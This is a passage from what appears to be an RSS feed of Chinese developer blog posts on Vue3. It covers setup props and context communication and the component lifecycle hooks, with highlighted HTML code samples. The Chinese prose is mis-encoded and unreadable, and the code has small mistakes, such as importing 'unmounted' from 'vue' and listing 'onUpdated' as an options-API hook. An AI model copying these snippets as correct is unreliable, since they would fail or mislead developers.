    <span class="hljs-tag">&lt;/<span class="hljs-name">Child</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- æ˜¾ç¤ºå­ç»„ä»¶ä¼ é€’çš„æ•°æ® --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"child-data"</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"childSubmitData"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>å­ç»„ä»¶ä¼ é€’çš„æ•°æ®ï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>msgï¼š{{ childSubmitData.msg }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>nameï¼š{{ childSubmitData.name }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

    <span class="hljs-comment">&lt;!-- ç‚¹å‡»æŒ‰é’®è®¿é—®å­ç»„ä»¶æš´éœ²çš„æ–¹æ³•/å±æ€§ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"accessChildExpose"</span>&gt;</span>è®¿é—®å­ç»„ä»¶æš´éœ²çš„å†…å®¹<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// å¯¼å…¥å­ç»„ä»¶</span>
<span class="hljs-keyword">import</span> <span class="hljs-title class_">Child</span> <span class="hljs-keyword">from</span> <span class="hljs-string">'./Child.vue'</span>;
<span class="hljs-comment">// å¯¼å…¥vueçš„refï¼ˆç”¨äºåˆ›å»ºå­ç»„ä»¶çš„å¼•ç”¨ï¼‰å’ŒonMountedï¼ˆç”Ÿå‘½å‘¨æœŸï¼‰</span>
<span class="hljs-keyword">import</span> { ref, onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
  <span class="hljs-comment">// æ³¨å†Œå­ç»„ä»¶</span>
  <span class="hljs-attr">components</span>: {
    <span class="hljs-title class_">Child</span>
  },

  <span class="hljs-title function_">setup</span>(<span class="hljs-params"/>) {
    <span class="hljs-comment">// ğŸ‘‰ 1. åˆ›å»ºå­ç»„ä»¶çš„refå¼•ç”¨ï¼ˆç”¨äºè®¿é—®å­ç»„ä»¶æš´éœ²çš„å†…å®¹ï¼‰</span>
    <span class="hljs-keyword">const</span> childRef = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>);

    <span class="hljs-comment">// ğŸ‘‰ 2. æ¥æ”¶å­ç»„ä»¶çš„è‡ªå®šä¹‰äº‹ä»¶æ•°æ®</span>
    <span class="hljs-keyword">const</span> childSubmitData = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>);
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChildSubmit</span> = (<span class="hljs-params">data</span>) =&gt; {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'çˆ¶ç»„ä»¶æ¥æ”¶åˆ°å­ç»„ä»¶çš„submitäº‹ä»¶æ•°æ®ï¼š'</span>, data);
      childSubmitData.<span class="hljs-property">value</span> = data; <span class="hljs-comment">// æŠŠæ•°æ®å­˜åˆ°å“åº”å¼å˜é‡ä¸­ï¼Œæ¨¡æ¿ä¸­æ˜¾ç¤º</span>
    };

    <span class="hljs-comment">// ğŸ‘‰ 3. è®¿é—®å­ç»„ä»¶é€šè¿‡exposeæš´éœ²çš„å†…å®¹</span>
    <span class="hljs-keyword">const</span> <span class="hljs-title function_">accessChildExpose</span> = (<span class="hljs-params"/>) =&gt; {
      <span class="hljs-comment">// ç¡®ä¿å­ç»„ä»¶å·²æŒ‚è½½ï¼ˆé¿å…åˆå§‹æ—¶childRef.valueä¸ºnullï¼‰</span>
      <span class="hljs-keyword">if</span> (childRef.<span class="hljs-property">value</span>) {
        <span class="hljs-comment">// è°ƒç”¨å­ç»„ä»¶æš´éœ²çš„internalFnæ–¹æ³•</span>
        <span class="hljs-keyword">const</span> fnResult = childRef.<span class="hljs-property">value</span>.<span class="hljs-title function_">internalFn</span>();
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è°ƒç”¨å­ç»„ä»¶æš´éœ²çš„internalFnç»“æœï¼š'</span>, fnResult);

        <span class="hljs-comment">// è·å–å­ç»„ä»¶æš´éœ²çš„internalDataå±æ€§</span>
        <span class="hljs-keyword">const</span> internalData = childRef.<span class="hljs-property">value</span>.<span class="hljs-property">internalData</span>;
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è·å–å­ç»„ä»¶æš´éœ²çš„internalDataï¼š'</span>, internalData);

        <span class="hljs-comment">// è°ƒç”¨å­ç»„ä»¶æš´éœ²çš„getPropsNameæ–¹æ³•ï¼ˆè·å–å­ç»„ä»¶çš„props.nameï¼‰</span>
        <span class="hljs-keyword">const</span> propsName = childRef.<span class="hljs-property">value</span>.<span class="hljs-title function_">getPropsName</span>();
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å­ç»„ä»¶çš„props.nameï¼š'</span>, propsName);

        <span class="hljs-comment">// æ³¨æ„ï¼šå­ç»„ä»¶æœªæš´éœ²çš„å†…å®¹ï¼Œçˆ¶ç»„ä»¶æ— æ³•è®¿é—®ï¼ˆæ¯”å¦‚å­ç»„ä»¶çš„handleClickï¼‰</span>
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è®¿é—®å­ç»„ä»¶æœªæš´éœ²çš„handleClickï¼š'</span>, childRef.<span class="hljs-property">value</span>.<span class="hljs-property">handleClick</span>); <span class="hljs-comment">// undefined</span>
      }
    };

    <span class="hljs-comment">// ğŸ‘‰ 4. ç”Ÿå‘½å‘¨æœŸï¼šç»„ä»¶æŒ‚è½½åï¼Œä¹Ÿå¯ä»¥ä¸»åŠ¨è®¿é—®å­ç»„ä»¶æš´éœ²çš„å†…å®¹</span>
    <span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'===== ç»„ä»¶æŒ‚è½½åè®¿é—®å­ç»„ä»¶æš´éœ²å†…å®¹ ====='</span>);
      <span class="hljs-keyword">if</span> (childRef.<span class="hljs-property">value</span>) {
        <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æŒ‚è½½åè·å–internalDataï¼š'</span>, childRef.<span class="hljs-property">value</span>.<span class="hljs-property">internalData</span>);
      }
    });

    <span class="hljs-comment">// returnéœ€è¦åœ¨æ¨¡æ¿ä¸­ä½¿ç”¨çš„å˜é‡/æ–¹æ³•</span>
    <span class="hljs-keyword">return</span> {
      childRef,
      childSubmitData,
      handleChildSubmit,
      accessChildExpose
    };
  }
};
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<h3 data-id="heading-7">ä¸‰ã€å…³é”®æ€»ç»“</h3>
<ol>
<li><code>props</code>ï¼š<strong>è§„åˆ™å®Œå…¨ç»§æ‰¿ Vue2</strong>ï¼Œä»…åœ¨ Vue3 setup ä¸­éœ€é€šè¿‡ç¬¬ä¸€ä¸ªå‚æ•°è®¿é—®ï¼Œæ³¨æ„å“åº”å¼è§£æ„ï¼ˆç”¨Â <code>toRefs</code>ï¼‰ï¼›</li>
<li><code>context</code>ï¼š<strong>æ›¿ä»£ Vue2 ä¸­ this ä¸Šçš„é€šä¿¡å±æ€§</strong>ï¼ŒæŠŠÂ <code>$emit/$slots/$attrs</code>Â èšåˆåˆ° <strong>ä¸Šä¸‹æ–‡( context )</strong> ï¼Œæ–°å¢Â <code>expose()</code>Â å¢å¼ºç»„ä»¶å°è£…æ€§ï¼ˆVue2 çˆ¶ç»„ä»¶é€šè¿‡ ref èƒ½è®¿é—®å­ç»„ä»¶æ‰€æœ‰å†…å®¹ï¼ŒVue3 éœ€ä¸»åŠ¨æš´éœ²æ‰å¯è§ï¼‰ï¼›</li>
<li>ç®€åŒ–è®°å¿†ï¼š<code>setup(props, context)</code>Â â†’ ç¬¬ä¸€ä¸ªå‚æ•°ç®¡ã€Œçˆ¶ä¼ å­çš„ propsã€ï¼Œç¬¬äºŒä¸ªå‚æ•°ç®¡ã€Œå­ä¼ çˆ¶ã€æ’æ§½ã€é€ä¼ å±æ€§ã€æš´éœ²å†…å®¹ã€ã€‚</li>
</ol>
<p>è¿™ç§è®¾è®¡æ—¢ä¿ç•™äº† Vue2 çš„ä½¿ç”¨ä¹ æƒ¯ï¼Œåˆè®©ç»„åˆå¼ API è„±ç¦»äº†Â <code>this</code>Â çš„æŸç¼šï¼Œé€»è¾‘æ›´èšåˆï¼Œæ˜¯ Vue3 å…¼é¡¾ã€Œæ˜“ç”¨æ€§ã€å’Œã€Œçµæ´»æ€§ã€çš„æ ¸å¿ƒè®¾è®¡ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[é¢è¯•å®˜ : â€œ è¯´ä¸€ä¸‹ Vue çš„ 8 ä¸ªç”Ÿå‘½å‘¨æœŸé’©å­éƒ½åšäº†ä»€ä¹ˆ ? â€]]></title>    <link>https://juejin.cn/post/7590054976489783336</link>    <guid>https://juejin.cn/post/7590054976489783336</guid>    <pubDate>2026-01-02T12:53:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7590054976489783336" data-draft-id="7590159073988739124" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="é¢è¯•å®˜ : â€œ è¯´ä¸€ä¸‹ Vue çš„ 8 ä¸ªç”Ÿå‘½å‘¨æœŸé’©å­éƒ½åšäº†ä»€ä¹ˆ ? â€"/> <meta itemprop="keywords" content="å‰ç«¯,Vue.js,é¢è¯•"/> <meta itemprop="datePublished" content="2026-01-02T12:53:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="åƒå¯»girling"/> <meta itemprop="url" content="https://juejin.cn/user/2276467567770442"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            é¢è¯•å®˜ : â€œ è¯´ä¸€ä¸‹ Vue çš„ 8 ä¸ªç”Ÿå‘½å‘¨æœŸé’©å­éƒ½åšäº†ä»€ä¹ˆ ? â€
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2276467567770442/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    åƒå¯»girling
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T12:53:42.000Z" title="Fri Jan 02 2026 12:53:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»6åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">ä¸€ã€Vue3 8 ä¸ªæ ¸å¿ƒç”Ÿå‘½å‘¨æœŸé’©å­ï¼ˆæŒ‰æ‰§è¡Œé¡ºåºï¼‰</h3>




































































<table><thead><tr><th>é˜¶æ®µ</th><th>é€‰é¡¹å¼ API åç§°</th><th>ç»„åˆå¼ API åç§°</th><th>æ‰§è¡Œæ—¶æœº</th><th>æ ¸å¿ƒä½œç”¨ &amp; å®æˆ˜åœºæ™¯</th></tr></thead><tbody><tr><td>åˆå§‹åŒ–é˜¶æ®µ</td><td>beforeCreate</td><td>æ— ï¼ˆsetup æ›¿ä»£ï¼‰</td><td>å®ä¾‹åˆ›å»ºå‰ï¼Œæ•°æ® / æ–¹æ³•æœªåˆå§‹åŒ–ï¼Œ<code>this</code>Â ä¸å¯ç”¨</td><td>Vue2 ä¸­ç”¨äºåˆå§‹åŒ–éå“åº”å¼æ•°æ®ï¼›Vue3 ä¸­é€»è¾‘ç§»åˆ°Â <code>setup</code>Â æœ€é¡¶éƒ¨ï¼ˆæ— å“åº”å¼æ“ä½œï¼‰</td></tr><tr><td>åˆå§‹åŒ–é˜¶æ®µ</td><td>created</td><td>æ— ï¼ˆsetup æ›¿ä»£ï¼‰</td><td>å®ä¾‹åˆ›å»ºå®Œæˆï¼Œæ•°æ® / æ–¹æ³•å·²åˆå§‹åŒ–ï¼ŒDOM æœªç”Ÿæˆ</td><td>1. å‘èµ·å¼‚æ­¥è¯·æ±‚ï¼ˆæ¥å£è¯·æ±‚ï¼‰ï¼›2. åˆå§‹åŒ–é DOM ç›¸å…³é€»è¾‘ï¼ˆå¦‚æ•°æ®æ ¼å¼åŒ–ï¼‰</td></tr><tr><td>æŒ‚è½½é˜¶æ®µ</td><td>beforeMount</td><td>onBeforeMount</td><td>æŒ‚è½½å¼€å§‹å‰ï¼Œæ¨¡æ¿ç¼–è¯‘å®Œæˆï¼ŒDOM æœªæŒ‚è½½åˆ°é¡µé¢ï¼ˆ<code>$el</code>Â æœªç”Ÿæˆï¼‰</td><td>1. é¢„æ“ä½œ DOM ç»“æ„ï¼ˆå¦‚è®¡ç®— DOM å°ºå¯¸ï¼Œéœ€ç»“åˆÂ <code>nextTick</code>ï¼‰ï¼›2. åˆå§‹åŒ–ç¬¬ä¸‰æ–¹åº“ï¼ˆæŒ‚è½½å‰å‡†å¤‡ï¼‰</td></tr><tr><td>æŒ‚è½½é˜¶æ®µ</td><td>mounted</td><td>onMounted</td><td>DOM æŒ‚è½½å®Œæˆï¼ˆ<code>$el</code>Â å·²æŒ‚è½½ï¼‰ï¼Œé¡µé¢å¯è§</td><td>1. æ“ä½œçœŸå® DOMï¼ˆå¦‚åˆå§‹åŒ– ECharts / åœ°å›¾ï¼‰ï¼›2. å‘èµ·ä¾èµ– DOM çš„å¼‚æ­¥è¯·æ±‚ï¼›3. ç›‘å¬ DOM äº‹ä»¶</td></tr><tr><td>æ›´æ–°é˜¶æ®µ</td><td>beforeUpdate</td><td>onBeforeUpdate</td><td>æ•°æ®æ›´æ–°åï¼ŒDOM é‡æ–°æ¸²æŸ“å‰</td><td>1. è·å–æ›´æ–°å‰çš„ DOM çŠ¶æ€ï¼ˆå¦‚æ—§è¾“å…¥æ¡†å€¼ï¼‰ï¼›2. å–æ¶ˆä¸å¿…è¦çš„ç›‘å¬ / å®šæ—¶å™¨ï¼ˆé¿å…é‡å¤æ‰§è¡Œï¼‰</td></tr><tr><td>æ›´æ–°é˜¶æ®µ</td><td>onUpdated</td><td>onUpdated</td><td>DOM é‡æ–°æ¸²æŸ“å®Œæˆï¼Œé¡µé¢å·²æ›´æ–°</td><td>1. è·å–æ›´æ–°åçš„ DOM çŠ¶æ€ï¼›2. é‡æ–°è®¡ç®— DOM ç›¸å…³æ•°æ®ï¼ˆå¦‚æ»šåŠ¨ä½ç½®é‡ç½®ï¼‰</td></tr><tr><td>å¸è½½é˜¶æ®µ</td><td>beforeUnmount</td><td>onBeforeUnmount</td><td>ç»„ä»¶å¸è½½å‰ï¼ˆå®ä¾‹ä»å¯ç”¨ï¼ŒDOM æœªé”€æ¯ï¼‰</td><td>1. æ¸…ç†å‰¯ä½œç”¨ï¼ˆæ¸…é™¤å®šæ—¶å™¨ / äº‹ä»¶ç›‘å¬ï¼‰ï¼›2. é”€æ¯ç¬¬ä¸‰æ–¹åº“å®ä¾‹ï¼ˆå¦‚ ECharts é”€æ¯ï¼‰</td></tr><tr><td>å¸è½½é˜¶æ®µ</td><td>unmounted</td><td>onUnmounted</td><td>ç»„ä»¶å¸è½½å®Œæˆï¼ŒDOM é”€æ¯ï¼Œå®ä¾‹å¤±æ•ˆ</td><td>1. æœ€ç»ˆæ¸…ç†ï¼ˆå¦‚å–æ¶ˆæ¥å£è¯·æ±‚ï¼‰ï¼›2. é‡Šæ”¾å†…å­˜ï¼ˆæ¸…ç©ºå¤§å‹æ•°ç»„ / å¯¹è±¡å¼•ç”¨ï¼‰</td></tr></tbody></table>
<h3 data-id="heading-1">äºŒã€å…³é”®ç»†èŠ‚ï¼ˆVue3 æ ¸å¿ƒå˜åŒ–ï¼‰</h3>
<h4 data-id="heading-2">1. setup æ›¿ä»£ beforeCreate/created</h4>
<p>Vue3 ä¸­Â <code>setup</code>Â æ‰§è¡Œæ—¶æœº =Â <code>beforeCreate</code>Â +Â <code>created</code>ï¼Œè¿™ä¸¤ä¸ªé’©å­åœ¨ç»„åˆå¼ API ä¸­è¢«åºŸå¼ƒï¼Œæ‰€æœ‰åˆå§‹åŒ–é€»è¾‘ç›´æ¥å†™åœ¨Â <code>setup</code>Â ä¸­ï¼š</p>
<p>ä»¥ä¸‹æ˜¯ Vue3 ç”Ÿå‘½å‘¨æœŸé’©å­çš„<strong>å®Œæ•´å¯è¿è¡Œä»£ç ç¤ºä¾‹</strong>ï¼ŒåŒ…å«<strong>é€‰é¡¹å¼ API</strong>Â å’Œ<strong>ç»„åˆå¼ APIï¼ˆ<code>&lt;script setup&gt;</code>Â æ¨èå†™æ³•ï¼‰</strong> Â ä¸¤ç§é£æ ¼ï¼Œé™„å¸¦è¯¦ç»†æ³¨é‡Šå’Œå®æˆ˜åœºæ™¯ï¼ˆå¦‚æ¥å£è¯·æ±‚ã€DOM æ“ä½œã€å®šæ—¶å™¨æ¸…ç†ç­‰ï¼‰ï¼Œå¯ç›´æ¥å¤åˆ¶åˆ° Vue3 é¡¹ç›®ä¸­è¿è¡Œã€‚</p>
<h3 data-id="heading-3">ä¸‰ã€ç»„åˆå¼ API ç¤ºä¾‹ï¼ˆ<code>&lt;script setup&gt;</code>Â æ¨èï¼‰</h3>
<p><strong>Vue3 ç”Ÿå‘½å‘¨æœŸæ¼”ç¤º</strong></p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"life-cycle-demo"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>Vue3 ç”Ÿå‘½å‘¨æœŸæ¼”ç¤ºï¼ˆç»„åˆå¼ APIï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- ç»‘å®šå“åº”å¼æ•°æ®ï¼Œè§¦å‘æ›´æ–°é˜¶æ®µ --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å½“å‰è®¡æ•°ï¼š{{ count }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"count++"</span>&gt;</span>ç‚¹å‡»æ›´æ–°è®¡æ•°ï¼ˆè§¦å‘æ›´æ–°é’©å­ï¼‰<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-comment">&lt;!-- æŒ‚è½½ ECharts ç¤ºä¾‹ DOM --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"chart"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">"width: 300px; height: 200px; margin: 20px 0;"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { 
  ref, 
  onBeforeMount, 
  onMounted, 
  onBeforeUpdate, 
  onUpdated, 
  onBeforeUnmount, 
  unmounted 
} <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>;
<span class="hljs-comment">// æ¨¡æ‹Ÿ EChartsï¼ˆå®é™…éœ€å®‰è£…ï¼šnpm install echartsï¼‰</span>
<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> echarts <span class="hljs-keyword">from</span> <span class="hljs-string">'echarts'</span>;

<span class="hljs-comment">// ğŸ«±ğŸ«±ğŸ«± 1. setup æœ¬èº«æ›¿ä»£ beforeCreate + createdï¼ˆåˆå§‹åŒ–é˜¶æ®µï¼‰</span>
